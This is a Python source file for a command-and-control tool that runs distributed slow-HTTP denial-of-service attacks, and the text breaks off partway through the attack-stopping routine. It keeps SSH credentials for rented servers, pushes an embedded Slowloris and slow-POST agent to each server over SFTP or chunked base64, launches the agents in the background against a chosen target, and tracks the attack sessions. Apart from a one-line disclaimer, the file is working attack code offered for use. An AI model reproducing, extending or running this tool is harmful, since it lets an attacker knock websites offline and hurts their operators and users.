#!/usr/bin/env python3
"""
Distributed Slow HTTP Testing C2 - Complete Fixed Version
Author: Security Research Tool
Purpose: Educational and Authorized Penetration Testing Only

⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️
Unauthorized use against systems you don't own is ILLEGAL!
"""

import sqlite3
import paramiko
import threading
import json
import time
import os
import sys
import signal
import socket
import random
import string
import subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import base64
from cryptography.fernet import Fernet
import colorama
from colorama import Fore, Back, Style
from urllib.parse import urlparse

# Initialize colorama for cross-platform colored output
colorama.init(autoreset=True)

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    PURPLE = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    BOLD = Style.BRIGHT
    DIM = Style.DIM
    RESET = Style.RESET_ALL

class SecurityManager:
    def __init__(self):
        key_file = 'key.key'
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                self.key = f.read()
        else:
            self.key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(self.key)
            os.chmod(key_file, 0o600) 
        self.cipher = Fernet(self.key)
    
    def encrypt_password(self, password):
        return base64.b64encode(self.cipher.encrypt(password.encode())).decode()
    
    def decrypt_password(self, encrypted_password):
        try:
            return self.cipher.decrypt(base64.b64decode(encrypted_password.encode())).decode()
        except Exception:
            return encrypted_password

class DatabaseManager:
    def __init__(self, db_file='c2_database.db'):
        self.db_file = db_file
        self.init_database()
    
    def init_database(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        # VPS nodes table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vps_nodes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT NOT NULL UNIQUE,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                ssh_port INTEGER DEFAULT 22,
                status TEXT DEFAULT 'offline',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                location TEXT,
                capabilities TEXT,
                agent_deployed BOOLEAN DEFAULT 0,
                attack_count INTEGER DEFAULT 0
            )
        ''')
        
        # Attack sessions table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_name TEXT NOT NULL,
                target_url TEXT NOT NULL,
                target_host TEXT,
                attack_type TEXT NOT NULL,
                vps_nodes TEXT,
                start_time TIMESTAMP,
                end_time TIMESTAMP,
                status TEXT DEFAULT 'pending',
                parameters TEXT,
                results TEXT,
                total_connections INTEGER DEFAULT 0,
                success_rate REAL DEFAULT 0.0
            )
        ''')
        
        # Attack results table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id INTEGER,
                vps_ip TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                connections_active INTEGER DEFAULT 0,
                packets_sent INTEGER DEFAULT 0,
                bytes_sent INTEGER DEFAULT 0,
                status TEXT,
                error_message TEXT,
                FOREIGN KEY (session_id) REFERENCES attack_sessions (id)
            )
        ''')
        
        conn.commit()
        conn.close()
        
        # Set secure permissions
        os.chmod(self.db_file, 0o600)
    
    def add_vps(self, ip, username, encrypted_password, port=22, location="Unknown"):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                INSERT INTO vps_nodes (ip_address, username, password, ssh_port, location)
                VALUES (?, ?, ?, ?, ?)
            ''', (ip, username, encrypted_password, port, location))
            conn.commit()
            return cursor.lastrowid
        except sqlite3.IntegrityError:
            return None
        finally:
            conn.close()
    
    def get_all_vps(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM vps_nodes ORDER BY id')
        vps_list = cursor.fetchall()
        conn.close()
        return vps_list
    
    def update_vps_status(self, ip, status, agent_deployed=None):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        query = 'UPDATE vps_nodes SET status = ?, last_seen = ?'
        params = [status, datetime.now().isoformat()]
        
        if agent_deployed is not None:
            query += ', agent_deployed = ?'
            params.append(agent_deployed)
        
        query += ' WHERE ip_address = ?'
        params.append(ip)
        
        cursor.execute(query, params)
        conn.commit()
        conn.close()
    
    def remove_vps(self, ip):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM vps_nodes WHERE ip_address = ?', (ip,))
        affected_rows = cursor.rowcount
        conn.commit()
        conn.close()
        return affected_rows > 0
    
    def create_attack_session(self, session_name, target_url, target_host, attack_type, vps_list, parameters):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        total_connections = len(vps_list) * parameters.get('connections', 100)
        
        cursor.execute('''
            INSERT INTO attack_sessions (session_name, target_url, target_host, attack_type, vps_nodes, 
                                        parameters, start_time, status, total_connections)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (session_name, target_url, target_host, attack_type, json.dumps(vps_list), 
              json.dumps(parameters), datetime.now().isoformat(), 'running', total_connections))
        
        session_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return session_id
    
    def get_attack_sessions(self, limit=20):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM attack_sessions ORDER BY start_time DESC LIMIT ?', (limit,))
        sessions = cursor.fetchall()
        conn.close()
        return sessions

class SSHManager:
    def __init__(self, security_manager):
        self.connections = {}
        self.security_manager = security_manager
        self.connection_cache = {}
        self.lock = threading.Lock()
    
    def connect_vps(self, ip, username, encrypted_password, port=22, timeout=15):
        try:
            password = self.security_manager.decrypt_password(encrypted_password)
            
            # Cache credentials for auto-reconnect
            self.connection_cache[ip] = {
                'username': username,
                'encrypted_password': encrypted_password,
                'port': port
            }
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                hostname=ip,
                username=username,
                password=password,
                port=port,
                timeout=timeout,
                look_for_keys=False,
                allow_agent=False
            )
            
            # Test connection with simple command
            stdin, stdout, stderr = ssh.exec_command('echo "test" && whoami', timeout=10)
            output = stdout.read().decode().strip()
            error = stderr.read().decode().strip()
            
            if not output or error:
                ssh.close()
                return False, f"Connection test failed: {error if error else 'No output'}"
            
            with self.lock:
                if ip in self.connections:
                    try:
                        self.connections[ip].close()
                    except:
                        pass
                self.connections[ip] = ssh
            
            return True, f"Connected successfully as {output.split()[-1]}"
            
        except paramiko.AuthenticationException:
            return False, "Authentication failed - invalid credentials"
        except paramiko.SSHException as e:
            return False, f"SSH error: {str(e)}"
        except socket.timeout:
            return False, "Connection timeout"
        except Exception as e:
            return False, f"Connection failed: {str(e)}"
    
    def reconnect_vps(self, ip):
        """Attempt to reconnect to VPS using cached credentials"""
        if ip not in self.connection_cache:
            return False, "No cached credentials for this VPS"
        
        cached = self.connection_cache[ip]
        return self.connect_vps(
            ip, 
            cached['username'], 
            cached['encrypted_password'], 
            cached['port']
        )
    
    def disconnect_vps(self, ip):
        with self.lock:
            if ip in self.connections:
                try:
                    self.connections[ip].close()
                    del self.connections[ip]
                    return True
                except Exception:
                    pass
        return False
    
    def execute_command(self, ip, command, timeout=60, auto_reconnect=True):
        """Execute command with auto-reconnect capability"""
        
        # Check if connection exists, try to reconnect if not
        if ip not in self.connections:
            if auto_reconnect:
                print(f"[SSH] No connection to {ip}, attempting reconnect...")
                success, message = self.reconnect_vps(ip)
                if not success:
                    return False, f"Reconnection failed: {message}"
            else:
                return False, "No connection to VPS"
        
        try:
            with self.lock:
                ssh_client = self.connections[ip]
            
            stdin, stdout, stderr = ssh_client.exec_command(command, timeout=timeout)
            
            # Set timeout for reading
            stdout.channel.settimeout(timeout)
            stderr.channel.settimeout(timeout)
            
            output = stdout.read().decode('utf-8', errors='ignore').strip()
            error = stderr.read().decode('utf-8', errors='ignore').strip()
            exit_status = stdout.channel.recv_exit_status()
            
            if exit_status == 0:
                return True, output if output else "Command executed successfully"
            else:
                return False, error if error else f"Command failed with exit status {exit_status}"
                
        except socket.timeout:
            return False, "Command execution timeout"
        except Exception as e:
            # Connection might be broken, remove it
            with self.lock:
                if ip in self.connections:
                    try:
                        self.connections[ip].close()
                    except:
                        pass
                    del self.connections[ip]
            
            # Try to reconnect and execute again if auto_reconnect is enabled
            if auto_reconnect:
                print(f"[SSH] Command failed on {ip}, attempting reconnect and retry...")
                success, message = self.reconnect_vps(ip)
                if success:
                    return self.execute_command(ip, command, timeout, auto_reconnect=False)
                else:
                    return False, f"Reconnection failed: {message}"
            
            return False, str(e)
    
    def deploy_agent(self, ip):
        """Deploy fixed slow HTTP attack agent to VPS"""
        
        print(f"{Colors.CYAN}[DEPLOYING] Fixed agent to {ip}...{Colors.RESET}")
        
        # Step 1: Cleanup and preparation
        print(f"{Colors.CYAN}[STEP 1] Cleanup and preparation...{Colors.RESET}")
        cleanup_commands = [
            "pkill -f 'python.*agent' 2>/dev/null || true",
            "rm -rf /tmp/slowhttp_c2 /tmp/*.py 2>/dev/null || true", 
            "mkdir -p /tmp/slowhttp_c2",
            "chmod 755 /tmp/slowhttp_c2"
        ]
        
        for cmd in cleanup_commands:
            success, output = self.execute_command(ip, cmd, timeout=10)
            # Ignore errors for cleanup commands
        
        # Step 2: Test Python availability
        print(f"{Colors.CYAN}[STEP 2] Testing Python environment...{Colors.RESET}")
        success, output = self.execute_command(ip, "python3 --version && which python3")
        if not success:
            return False, f"Python3 not available: {output}"
        
        print(f"{Colors.GREEN}  Python3 available: {output.split()[1] if output else 'Unknown version'}{Colors.RESET}")
        
        # Step 3: Create fixed agent script
        print(f"{Colors.CYAN}[STEP 3] Creating fixed agent script...{Colors.RESET}")
        
        fixed_agent_script = '''#!/usr/bin/env python3
"""
Fixed Slow HTTP Attack Agent
Purpose: Educational and Authorized Testing Only
"""
import socket
import threading
import time
import sys
import random
import string
import signal
import argparse

try:
    import ssl
    import select
    from urllib.parse import urlparse
    SSL_AVAILABLE = True
except ImportError as e:
    print(f"Warning: Some modules unavailable: {e}")
    SSL_AVAILABLE = False
    # Basic fallback
    class urlparse:
        def __init__(self, url):
            self.scheme = 'http'
            self.hostname = url.split('://')[1].split('/')[0].split(':')[0] if '://' in url else url.split('/')[0].split(':')[0]
            port_part = url.split('://')[1].split('/')[0] if '://' in url else url.split('/')[0]
            self.port = int(port_part.split(':')[1]) if ':' in port_part else None

class SlowHTTPAttack:
    def __init__(self, host, port=80, use_ssl=False):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl and SSL_AVAILABLE
        self.conns = []
        self.running = False
        self.stats = {'sent': 0, 'errors': 0, 'active': 0, 'bytes_sent': 0}
        self.lock = threading.Lock()
    
    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            sock.connect((self.host, self.port))
            
            if self.use_ssl and SSL_AVAILABLE:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            return sock
        except Exception as e:
            with self.lock:
                self.stats['errors'] += 1
            return None
    
    def slowloris_attack(self, num_conns=100, delay=15, duration=0):
        print(f"[SLOWLORIS] Starting attack on {self.host}:{self.port}")
        print(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s")
        if self.use_ssl:
            print(f"[CONFIG] SSL/HTTPS enabled")
        
        self.running = True
        start_time = time.time()
        
        def slowloris_worker():
            sock = self.create_socket()
            if not sock:
                return
            
            try:
                # Build HTTP request properly
                session_id = random.randint(1000, 9999)
                cache_value = str(int(time.time()))
                
                request_lines = [
                    f"GET /?session={session_id}&cache={cache_value} HTTP/1.1",
                    f"Host: {self.host}",
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language: en-US,en;q=0.5",
                    "Accept-Encoding: gzip, deflate", 
                    "Connection: keep-alive",
                    "Cache-Control: no-cache"
                ]
                
                # Join with proper CRLF
                request = "\\r\\n".join(request_lines) + "\\r\\n"
                
                sock.send(request.encode())
                
                with self.lock:
                    self.conns.append(sock)
                    self.stats['sent'] += 1
                    self.stats['active'] += 1
                    self.stats['bytes_sent'] += len(request)
                
                # Keep alive loop
                while self.running and (duration == 0 or (time.time() - start_time) < duration):
                    try:
                        # Send fake header
                        header_name = ''.join(random.choices(string.ascii_letters, k=10))
                        header_value = ''.join(random.choices(string.ascii_letters + string.digits, k=15))
                        fake_header = f"X-{header_name}: {header_value}\\r\\n"
                        
                        sock.send(fake_header.encode())
                        
                        with self.lock:
                            self.stats['sent'] += 1
                            self.stats['bytes_sent'] += len(fake_header)
                        
                        # Variable delay
                        sleep_time = delay + random.uniform(-2, 2)
                        time.sleep(max(1, sleep_time))
                        
                        # Check socket status if select is available
                        if SSL_AVAILABLE:
                            try:
                                ready = select.select([sock], [], [], 0)
                                if ready[0]:
                                    data = sock.recv(1024)
                                    if not data:
                                        break
                            except:
                                break
                        
                    except Exception:
                        break
                        
            except Exception:
                with self.lock:
                    self.stats['errors'] += 1
            finally:
                try:
                    sock.close()
                    with self.lock:
                        if sock in self.conns:
                            self.conns.remove(sock)
                        self.stats['active'] -= 1
                except:
                    pass
        
        # Start workers
        threads = []
        print(f"[PHASE1] Starting {num_conns} worker threads...")
        for i in range(num_conns):
            if not self.running:
                break
            
            thread = threading.Thread(target=slowloris_worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)
            
            if (i + 1) % 25 == 0:
                print(f"[PROGRESS] {i + 1}/{num_conns} workers started")
            
            time.sleep(0.1)
        
        # Monitor
        cycle = 0
        while self.running and (duration == 0 or (time.time() - start_time) < duration):
            cycle += 1
            
            with self.lock:
                active = self.stats['active']
                sent = self.stats['sent'] 
                errors = self.stats['errors']
                bytes_total = self.stats['bytes_sent']
            
            print(f"[CYCLE {cycle}] Active: {active} | Sent: {sent} | Errors: {errors} | Bytes: {bytes_total}")
            
            if active == 0:
                print("[INFO] No active connections remaining")
                break
                
            time.sleep(30)
        
        self.running = False
        print("[COMPLETE] Slowloris attack finished")
    
    def slow_post_attack(self, num_conns=50, delay=10, duration=0):
        print(f"[SLOW POST] Starting attack on {self.host}:{self.port}")
        print(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s")
        
        self.running = True
        start_time = time.time()
        
        def post_worker(worker_id):
            sock = self.create_socket()
            if not sock:
                print(f"[WORKER {worker_id}] Connection failed")
                return
            
            try:
                content_length = random.randint(5000000, 20000000)  # 5-20MB
                
                # Build POST headers
                post_lines = [
                    f"POST /upload?worker={worker_id} HTTP/1.1",
                    f"Host: {self.host}",
                    "User-Agent: Mozilla/5.0 (compatible; SlowPOST)",
                    "Content-Type: application/x-www-form-urlencoded",
                    f"Content-Length: {content_length}",
                    "Connection: keep-alive",
                    "Expect: 100-continue",
                    ""  # Empty line for end of headers
                ]
                
                headers = "\\r\\n".join(post_lines) + "\\r\\n"
                sock.send(headers.encode())
                
                with self.lock:
                    self.conns.append(sock)
                    self.stats['sent'] += 1
                    self.stats['active'] += 1
                    self.stats['bytes_sent'] += len(headers)
                
                print(f"[WORKER {worker_id}] POST headers sent, {content_length:,} bytes to send")
                
                # Send data slowly
                bytes_sent = 0
                while (self.running and 
                       bytes_sent < content_length and 
                       (duration == 0 or (time.time() - start_time) < duration)):
                    
                    try:
                        # Send small chunk
                        chunk_size = random.randint(1, 8)
                        chunk_data = ''.join(random.choices(string.ascii_letters + string.digits + '=&', k=chunk_size))
                        
                        sock.send(chunk_data.encode())
                        bytes_sent += len(chunk_data)
                        
                        with self.lock:
                            self.stats['sent'] += 1
                            self.stats['bytes_sent'] += len(chunk_data)
                        
                        # Progress update
                        if bytes_sent % 100000 == 0:  # Every 100KB
                            progress = (bytes_sent / content_length) * 100
                            print(f"[WORKER {worker_id}] {bytes_sent:,}/{content_length:,} ({progress:.1f}%)")
                        
                        # Slow transmission
                        sleep_time = delay + random.uniform(-2, 2)
                        time.sleep(max(0.5, sleep_time))
                        
                    except Exception:
                        break
                
                print(f"[WORKER {worker_id}] Completed {bytes_sent:,} bytes")
                
            except Exception as e:
                print(f"[WORKER {worker_id}] Error: {e}")
                with self.lock:
                    self.stats['errors'] += 1
            finally:
                try:
                    sock.close()
                    with self.lock:
                        if sock in self.conns:
                            self.conns.remove(sock)
                        self.stats['active'] -= 1
                except:
                    pass
        
        # Start workers
        threads = []
        print(f"[THREADS] Starting {num_conns} POST workers...")
        for i in range(num_conns):
            if not self.running:
                break
            
            thread = threading.Thread(target=post_worker, args=(i+1,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            
            print(f"[WORKER {i+1}] Started")
            time.sleep(0.3)
        
        # Monitor
        while self.running and (duration == 0 or (time.time() - start_time) < duration):
            active_workers = sum(1 for t in threads if t.is_alive())
            
            with self.lock:
                active_conns = self.stats['active']
                total_sent = self.stats['sent']
                total_errors = self.stats['errors']
                total_bytes = self.stats['bytes_sent']
            
            print(f"[STATUS] Workers: {active_workers}/{num_conns} | Active: {active_conns} | Packets: {total_sent} | Bytes: {total_bytes:,} | Errors: {total_errors}")
            
            if active_workers == 0:
                break
            
            time.sleep(15)
        
        self.running = False
        print("[COMPLETE] Slow POST attack finished")
    
    def stop_attack(self):
        self.running = False
        with self.lock:
            for sock in self.conns[:]:
                try:
                    sock.close()
                except:
                    pass
            self.conns.clear()

# Global instance for signal handling
attacker = None

def signal_handler(sig, frame):
    global attacker
    print("\\nReceived stop signal")
    if attacker:
        attacker.stop_attack()
    sys.exit(0)

def main():
    global attacker
    
    parser = argparse.ArgumentParser(description='Fixed Slow HTTP Attack Agent')
    parser.add_argument('target', help='Target hostname or URL')
    parser.add_argument('attack_type', choices=['slowloris', 'slow_post'], help='Attack type')
    parser.add_argument('--connections', '-c', type=int, default=100, help='Connections count')
    parser.add_argument('--delay', '-d', type=int, default=15, help='Delay between packets')
    parser.add_argument('--duration', '-t', type=int, default=0, help='Duration (0=unlimited)')
    
    args = parser.parse_args()
    
    # Parse target
    if args.target.startswith(('http://', 'https://')):
        if SSL_AVAILABLE:
            parsed = urlparse(args.target)
            target_host = parsed.hostname
            target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            use_ssl = parsed.scheme == 'https'
        else:
            # Fallback parsing
            parsed = urlparse(args.target)
            target_host = parsed.hostname
            target_port = parsed.port or 80
            use_ssl = False
    else:
        parts = args.target.split(':')
        target_host = parts[0]
        target_port = int(parts[1]) if len(parts) > 1 else 80
        use_ssl = target_port == 443
    
    print("=" * 50)
    print("FIXED SLOW HTTP ATTACK AGENT")
    print("=" * 50)
    print(f"Target: {target_host}:{target_port}")
    print(f"SSL: {'Enabled' if use_ssl else 'Disabled'}")
    print(f"Attack: {args.attack_type.upper()}")
    print(f"Connections: {args.connections}")
    print(f"Delay: {args.delay}s")
    print(f"Duration: {'Unlimited' if args.duration == 0 else str(args.duration) + 's'}")
    print("=" * 50)
    
    # Signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Create attacker
    attacker = SlowHTTPAttack(target_host, target_port, use_ssl)
    
    try:
        if args.attack_type == 'slowloris':
            attacker.slowloris_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == 'slow_post':
            attacker.slow_post_attack(args.connections, args.delay, args.duration)
    except KeyboardInterrupt:
        print("\\nAttack interrupted")
        attacker.stop_attack()
    except Exception as e:
        print(f"Attack error: {e}")
        attacker.stop_attack()
    finally:
        print("Agent shutdown complete")

if __name__ == "__main__":
    main()
'''
        
        # Step 4: Deploy with chunked method for reliability
        print(f"{Colors.CYAN}[STEP 4] Deploying agent script...{Colors.RESET}")
        
        try:
            # Method 1: Try SFTP first (most reliable)
            if ip in self.connections:
                try:
                    sftp = self.connections[ip].open_sftp()
                    
                    temp_local_file = f"/tmp/fixed_agent_{ip.replace('.', '_')}.py"
                    with open(temp_local_file, 'w') as f:
                        f.write(fixed_agent_script)
                    
                    sftp.put(temp_local_file, '/tmp/slowhttp_c2/agent.py')
                    sftp.close()
                    
                    os.remove(temp_local_file)
                    
                    print(f"{Colors.GREEN}  Agent transferred via SFTP{Colors.RESET}")
                    
                except Exception as sftp_error:
                    print(f"{Colors.YELLOW}  SFTP failed, using chunked transfer: {sftp_error}{Colors.RESET}")
                    
                    # Method 2: Chunked base64 transfer (fallback)
                    encoded_script = base64.b64encode(fixed_agent_script.encode()).decode()
                    
                    # Split into safe chunks (4KB each to avoid command line limits)
                    chunk_size = 4000
                    chunks = [encoded_script[i:i+chunk_size] for i in range(0, len(encoded_script), chunk_size)]
                    
                    print(f"{Colors.CYAN}  Transferring {len(chunks)} chunks...{Colors.RESET}")
                    
                    # Clear target file
                    self.execute_command(ip, "rm -f /tmp/slowhttp_c2/agent_encoded.txt")
                    
                    # Write chunks
                    for i, chunk in enumerate(chunks):
                        cmd = f"echo -n '{chunk}' >> /tmp/slowhttp_c2/agent_encoded.txt"
                        success, output = self.execute_command(ip, cmd, timeout=15)
                        if not success:
                            return False, f"Chunk {i+1} failed: {output}"
                        
                        if (i + 1) % 10 == 0:
                            print(f"{Colors.CYAN}    Chunk {i+1}/{len(chunks)} transferred{Colors.RESET}")
                    
                    # Decode final file
                    decode_cmd = "cd /tmp/slowhttp_c2 && base64 -d agent_encoded.txt > agent.py && rm agent_encoded.txt"
                    success, output = self.execute_command(ip, decode_cmd, timeout=20)
                    if not success:
                        return False, f"Decode failed: {output}"
                    
                    print(f"{Colors.GREEN}  Agent transferred via chunked base64{Colors.RESET}")
            
            else:
                return False, "No SSH connection available"
        
        except Exception as e:
            return False, f"Transfer error: {str(e)}"
        
        # Step 5: Final verification
        print(f"{Colors.CYAN}[STEP 5] Verifying deployment...{Colors.RESET}")
        
        verification_commands = [
            ("chmod +x /tmp/slowhttp_c2/agent.py", "Setting permissions"),
            ("ls -la /tmp/slowhttp_c2/agent.py", "File check"),
            ("python3 -c 'import py_compile; py_compile.compile(\"/tmp/slowhttp_c2/agent.py\")'", "Syntax check"),
            ("timeout 5 python3 /tmp/slowhttp_c2/agent.py --help 2>&1 | head -3", "Execution test")
        ]
        
        for cmd, description in verification_commands:
            print(f"{Colors.CYAN}  {description}...{Colors.RESET} ", end="", flush=True)
            success, output = self.execute_command(ip, cmd, timeout=15)
            
            if success and ("Fixed Slow HTTP" in output or "usage:" in output.lower() or description == "File check"):
                print(f"{Colors.GREEN}PASS{Colors.RESET}")
            else:
                print(f"{Colors.RED}FAIL{Colors.RESET}")
                if description == "Execution test":
                    return False, f"Agent execution test failed: {output}"
        
        print(f"{Colors.GREEN}[SUCCESS] Fixed agent deployed successfully to {ip}{Colors.RESET}")
        return True, "Fixed agent deployed and verified"
    
    def get_connection_status(self, ip):
        with self.lock:
            return ip in self.connections
    
    def close_all_connections(self):
        with self.lock:
            for ip in list(self.connections.keys()):
                try:
                    self.connections[ip].close()
                except:
                    pass
            self.connections.clear()

class AttackManager:
    def __init__(self, ssh_manager, db_manager):
        self.ssh_manager = ssh_manager
        self.db_manager = db_manager
        self.active_attacks = {}
        self.monitoring_threads = {}
    
    def launch_attack(self, session_id, target_url, attack_type, vps_list, parameters):
        """Launch attack with comprehensive error handling and auto-reconnect"""
        
        # Parse target URL properly
        if target_url.startswith('http'):
            parsed = urlparse(target_url)
            target_host = parsed.hostname or parsed.netloc
        else:
            target_host = target_url.split(':')[0].split('/')[0]
        
        self.active_attacks[session_id] = {
            'target_host': target_host,
            'target_url': target_url,
            'attack_type': attack_type,
            'vps_list': vps_list,
            'status': 'running',
            'start_time': datetime.now(),
            'parameters': parameters
        }
        
        print(f"\n{Colors.YELLOW}[ATTACK] Launching {attack_type} attack on {target_host}{Colors.RESET}")
        print(f"{Colors.CYAN}[CONFIG] VPS nodes: {len(vps_list)} | Connections per VPS: {parameters.get('connections', 100)}{Colors.RESET}")
        
        success_count = 0
        failed_vps = []
        
        # Get all VPS data from database for reconnection
        all_vps_data = {vps[1]: vps for vps in self.db_manager.get_all_vps()}
        
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[LAUNCHING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            # Check connection status and reconnect if necessary
            if not self.ssh_manager.get_connection_status(vps_ip):
                print(f"{Colors.YELLOW}RECONNECTING...{Colors.RESET} ", end="", flush=True)
                
                vps_data = all_vps_data.get(vps_ip)
                if vps_data:
                    reconnect_success, reconnect_msg = self.ssh_manager.connect_vps(
                        vps_data[1], vps_data[2], vps_data[3], vps_data[4]
                    )
                    if reconnect_success:
                        print(f"{Colors.GREEN}CONNECTED{Colors.RESET} ", end="", flush=True)
                        self.db_manager.update_vps_status(vps_ip, 'online')
                    else:
                        print(f"{Colors.RED}CONN_FAILED{Colors.RESET}")
                        failed_vps.append(f"{vps_ip}: Reconnection failed - {reconnect_msg}")
                        continue
                else:
                    print(f"{Colors.RED}NO_DATA{Colors.RESET}")
                    failed_vps.append(f"{vps_ip}: VPS data not found in database")
                    continue
            
            # Build attack command
            cmd = self._build_attack_command_fixed(target_url, attack_type, parameters)
            
            # Execute with longer timeout and better error detection
            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=30)
            
            # Better success detection
            if success and self._is_attack_launched_successfully(output):
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                success_count += 1
                
                # Verify agent is actually running
                time.sleep(2)
                verify_cmd = "ps aux | grep 'python3.*agent.py' | grep -v grep | wc -l"
                verify_success, verify_output = self.ssh_manager.execute_command(vps_ip, verify_cmd, timeout=10)
                
                if verify_success and verify_output.strip() != '0':
                    print(f"  {Colors.GREEN}→ Agent verified running ({verify_output.strip()} processes){Colors.RESET}")
                else:
                    print(f"  {Colors.YELLOW}→ Warning: Agent verification failed{Colors.RESET}")
                
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
                # Detailed error logging
                error_details = self._analyze_launch_error(output)
                failed_vps.append(f"{vps_ip}: {error_details}")
        
        if success_count > 0:
            print(f"\n{Colors.GREEN}[SUCCESS] Attack launched on {success_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
            if failed_vps:
                print(f"{Colors.YELLOW}[FAILED VPS]:{Colors.RESET}")
                for failure in failed_vps:
                    print(f"  {failure}")
            return True
        else:
            print(f"\n{Colors.RED}[FAILED] Could not launch attack on any VPS{Colors.RESET}")
            print(f"{Colors.YELLOW}[TROUBLESHOOTING TIPS]:{Colors.RESET}")
            print(f"  1. Verify VPS connections: Test All Connections")
            print(f"  2. Check agent deployment: Deploy Agents")
            print(f"  3. Test single VPS: Test Single VPS")
            for failure in failed_vps:
                print(f"  {failure}")
            return False
    
    def _is_attack_launched_successfully(self, output):
        """Better detection of successful attack launch"""
        success_indicators = [
            "Attack command executed",
            "SLOWLORIS] Starting attack",
            "SLOW POST] Starting",
            "nohup: ignoring input",
            "python.*agent"
        ]
        
        return any(indicator in output for indicator in success_indicators)
    
    def _analyze_launch_error(self, output):
        """Analyze launch error for better debugging"""
        if "Permission denied" in output:
            return "Permission denied - check SSH credentials"
        elif "No such file" in output:
            return "Agent file not found - redeploy agent"
        elif "python3: command not found" in output:
            return "Python3 not installed on VPS"
        elif "Connection refused" in output:
            return "Target refuses connections"
        elif "Traceback" in output:
            return f"Python error - {output.split('Traceback')[1][:100]}..."
        elif output.strip() == "":
            return "Command executed but no output (timeout?)"
        else:
            return f"Unknown error - {output[:150]}..."
    
    def _build_attack_command_fixed(self, target_url, attack_type, parameters):
        """Build attack command with timeout handling"""
        connections = max(1, parameters.get('connections', 100))
        delay = max(1, parameters.get('delay', 15))
        duration = parameters.get('duration', 0)
        
        # Clean target parsing
        if target_url.startswith(('http://', 'https://')):
            parsed = urlparse(target_url)
            target_clean = parsed.hostname
            if parsed.port:
                target_clean += f":{parsed.port}"
        else:
            target_clean = target_url.replace('http://', '').replace('https://', '').split('/')[0]
        
        # Build safer command
        cmd_parts = [
            "cd /tmp/slowhttp_c2",
            "nohup timeout 3600 python3 agent.py",  # 1 hour timeout
            f"'{target_clean}'",
            f"{attack_type}",
            f"--connections {connections}",
            f"--delay {delay}"
        ]
        
        if duration > 0:
            cmd_parts.append(f"--duration {duration}")
        
        # Add output redirection and background execution
        timestamp = int(time.time())
        cmd_parts.extend([
            f"> attack_{timestamp}.log 2>&1 &",
            "sleep 3",  # Wait for process to start
            "echo 'Attack command executed'",
            "ps aux | grep 'python.*agent' | grep -v grep | head -2"
        ])
        
        return " && ".join(cmd_parts)
    
    def stop_attack(self, session_id):
        """Enhanced attack stopping with verification"""
        if session_id not in self.active_attacks:
            return False, "Attack session not found"
        
        vps_list = self.active_attacks[session_id]['vps_list']
        
        print(f"\n{Colors.YELLOW}[ATTACK] Stopping attack on all VPS nodes...{Colors.RESET}")
        
        stop_count = 0
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[STOPPING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            # Enhanced process killing sequence
            commands = [
                "pkill -f 'python3.*agent.py' >/dev/null 2>&1 || true",
                "sleep 1",
                "pkill -9 -f 'agent.py' >/dev/null 2>&1 || true", 
                "killall python3 >/dev/null 2>&1 || true",
                "sleep 1",
                # Verify cleanup
                "ps aux | grep 'agent.py' | grep -v grep | awk '{print $2}' | xargs kill -9 >/dev/null 2>&1 || true",
                "sleep 1",
                "ps aux | grep 'agent.py' | grep -v grep | wc -l"
            ]
            
            remaining_procs = None
            for cmd in commands:
                success, output = self.ssh_manager.execute_command(vps_ip, cmd)
